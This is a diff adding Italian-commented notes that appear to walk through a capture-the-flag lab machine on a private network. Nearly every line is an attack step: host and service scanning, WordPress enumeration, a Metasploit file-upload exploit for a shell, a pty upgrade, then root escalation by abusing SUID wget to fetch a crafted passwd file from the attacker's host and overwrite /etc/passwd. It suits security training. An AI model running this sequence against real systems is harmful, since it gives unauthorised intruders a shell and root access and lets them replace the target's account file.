@@ -1,0 +1,42 @@
+sudo netdiscover // trovo gli indirizzi ip delle macchine della rete
+
+nmap -A 192.168.56.102 // una volta trovato l'ip della macchina trovo i servizi funzionanti su di essa
+
+dirb http://192.168.56.102 //cerco le directory nascoste nel server
+
+wpscan --url http://192.168.56.102/wordpress --enumerate p // per trovare le vulnerabilità di wordpress
+
+sudo msfconsole //per startare metasploit
+use exploit/unix/webapp/wp_reflexgallery_file_upload
+set rhosts 192.168.56.102
+set targeturi /wordpress
+exploit //boom
+
+
+shell //per poter eseguire codice arbitrario
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' //per aprire una shell di bash
+cd /home
+ls
+cd raj
+ls
+cat flag1.txt //challenge complete
+
+
+//Ma io voglio arrivare a fare una shell di root (privilege escalation)
+
+find / -perm -u=s -type f 2>/dev/null per vedere quelli che hanno il bit -u a 1
+
+noto che wget scrive file eseguiti come root e cp uguale
+
+openssl passwd -1 -salt ignite pwned //per generare una password per il file passwd
+
+$1$ignite$GOqi9Zj/FmdsioW5uiljk1 //il risultato che io voglio sovrascrivere sul file passwd
+
+cd /etc
+
+wget -O passwd http://192.168.56.1/passwd
+
+su ignite //inserire password pwned
+
+BOOM, siamo root
